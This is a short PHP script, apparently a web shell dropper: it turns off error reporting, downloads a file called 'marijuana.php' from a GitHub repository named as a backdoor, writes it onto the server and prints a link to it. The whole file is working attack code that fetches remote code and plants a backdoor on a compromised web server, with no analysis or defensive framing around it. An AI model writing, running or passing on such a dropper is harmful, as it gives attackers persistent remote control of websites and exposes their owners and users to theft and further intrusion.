<?php
error_reporting(0);
$shell = fopen("marijuana.php", "w");
$file_shell = file_get_contents("https://raw.githubusercontent.com/kakaroot1337/backdoor/main/marijuana.php");
fwrite($shell, $file_shell);
fclose($shell);
echo "<a href='marijuana.php'>Here Boyz</a>";
?>
